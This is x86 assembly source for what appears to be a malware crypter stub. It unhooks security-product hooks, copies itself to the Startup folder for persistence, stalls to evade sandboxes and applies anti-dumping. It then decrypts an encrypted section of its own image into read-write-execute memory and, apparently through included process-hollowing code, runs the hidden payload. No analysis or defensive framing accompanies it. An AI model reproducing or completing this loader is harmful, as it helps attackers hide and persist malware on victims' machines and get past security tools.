.386
.model flat, stdcall
option casemap:none
include sup.Inc
include AntiDump.asm
include Unhook.asm
include Startup.asm
include ProcessHollowing.asm
include Decrypt.asm
.code
Delay PROC time:DWORD
    invoke lstrcmp, addr delay_check, addr sz_delay_check
    .if eax == -1
        ret
    .endif
    invoke Sleep, time
    ret
Delay ENDP
start PROC
    LOCAL hModule:DWORD
    LOCAL sectionData:DWORD
    LOCAL sectionSize:DWORD
    LOCAL execMemory:DWORD
    LOCAL hFile:HANDLE
    
    invoke MessageBoxA, NULL, addr message_text, addr caption_text, MB_YESNO or MB_ICONWARNING
    cmp eax, IDNO
    je exit_error
    
    invoke unhook
    invoke CopyToStartup
    invoke Delay, 20000
    invoke AntiDump
    
    invoke GetModuleHandleA, NULL
    mov hModule, eax
    test eax, eax
    jz exit_error
    
    mov ebx, eax
    assume ebx:PTR IMAGE_DOS_HEADER
    
    movzx eax, word ptr [ebx].e_magic
    cmp ax, IMAGE_DOS_SIGNATURE
    jne exit_error
    
    mov edx, [ebx].e_lfanew
    add edx, ebx
    assume edx:PTR IMAGE_NT_HEADERS
    
    mov eax, [edx].Signature
    cmp eax, IMAGE_NT_SIGNATURE
    jne exit_error
    
    movzx ecx, word ptr [edx].FileHeader.NumberOfSections
    test ecx, ecx
    jz exit_error
    
    sub ecx, 2
    lea edx, [edx + sizeof IMAGE_NT_HEADERS]
    imul eax, ecx, sizeof IMAGE_SECTION_HEADER
    add edx, eax
    assume edx:PTR IMAGE_SECTION_HEADER
    
    mov eax, [edx].VirtualAddress
    add eax, hModule
    mov sectionData, eax
    
    mov eax, [edx].SizeOfRawData
    mov sectionSize, eax
    
    invoke VirtualAlloc, NULL, sectionSize, MEM_COMMIT or MEM_RESERVE, PAGE_RWX
    mov execMemory, eax
    
    invoke Decrypt, sectionData, sectionSize, execMemory
    invoke CloseHandle, hFile
    invoke getPE, execMemory
    invoke VirtualFree, execMemory, 0, MEM_RELEASE
    
exit_error:
    invoke ExitProcess, 0
    
start ENDP
END start
